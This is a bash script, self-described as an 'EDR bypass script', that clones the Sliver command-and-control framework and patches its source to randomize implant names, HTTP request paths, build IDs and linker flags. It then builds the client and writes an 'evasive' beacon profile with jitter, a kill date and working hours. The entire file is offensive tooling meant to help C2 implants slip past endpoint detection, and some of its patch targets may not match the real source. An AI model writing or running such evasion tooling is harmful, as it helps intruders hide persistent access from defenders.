# This will be saved as files/sliver_randomizer.sh
#!/bin/bash
# EDR bypass script - Creates unique Sliver payloads to evade detection

set -e
TEMP_DIR=$(mktemp -d)
SLIVER_DIR="${TEMP_DIR}/sliver"
LOG_FILE="/opt/c2/sliver_randomizer.log"

# Function to log messages
log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a $LOG_FILE
}

# Function to generate random strings
random_string() {
    local length=${1:-8}
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
}

# Clone Sliver
log "Cloning Sliver repository..."
git clone --quiet https://github.com/BishopFox/sliver.git $SLIVER_DIR
cd $SLIVER_DIR

# Generate randomization values
IMPLANT_NAME=$(random_string 8)
HTTP_PATH_ONE="/$(random_string 6)/$(random_string 5)"
HTTP_PATH_TWO="/$(random_string 7)/$(random_string 4)"
BEACON_MIN=$((30 + RANDOM % 60))
JITTER=$((10 + RANDOM % 20))

# 1. Modify implant name (critical for signatures)
log "Changing implant name to $IMPLANT_NAME..."
sed -i "s/ImplantName = \"sliver\"/ImplantName = \"$IMPLANT_NAME\"/g" server/configs/constants.go

# 2. Change HTTP request patterns (affects network signatures)
log "Modifying HTTP transport patterns..."
sed -i "s|\"/path/to/file\"|\"$HTTP_PATH_ONE\"|g" implant/sliver/transports/httpclient.go

# 3. Add unique build ID (affects binary signatures)
log "Adding unique build identifiers..."
cat >> implant/sliver/sliver.go << EOF

// Custom build identifier: $(random_string 32)
// Build timestamp: $(date +%s)
EOF

# 4. Modify PE headers through go build flags
log "Setting custom build flags..."
sed -i "s/LinkerStrip = \"-s -w\"/LinkerStrip = \"-s -w -buildid=$(random_string 10)\"/g" client/command/generate/binaries.go

# Build the modified Sliver
log "Building Sliver client only..."
make client

# Create custom profiles directory
mkdir -p /opt/c2/sliver-profiles

# Create evasive profile template
cat > /opt/c2/sliver-profiles/evasive-template.json << EOF
{
    "name": "evasive-$(random_string 4)",
    "http_urls": ["$HTTP_PATH_ONE", "$HTTP_PATH_TWO"],
    "http_headers": [
        "Accept-Language: en-US,en;q=0.$(( 7 + RANDOM % 3 ))",
        "X-Requested-With: XMLHttpRequest",
        "Cache-Control: max-age=$(( 100 + RANDOM % 400 ))"
    ],
    "beacon_interval": $BEACON_MIN,
    "beacon_jitter": $JITTER,
    "kill_date": "$(date -d "+60 days" +%Y-%m-%d)",
    "working_hours": {
        "start": "$(( 6 + RANDOM % 4 )):00",
        "end": "$(( 16 + RANDOM % 6 )):00"
    }
}
EOF

# Install client but use system Sliver server
log "Installing Sliver client..."
cp -f ./sliver-client /usr/local/bin/

# Cleanup
log "Cleaning up..."
rm -rf $TEMP_DIR

log "Customization complete."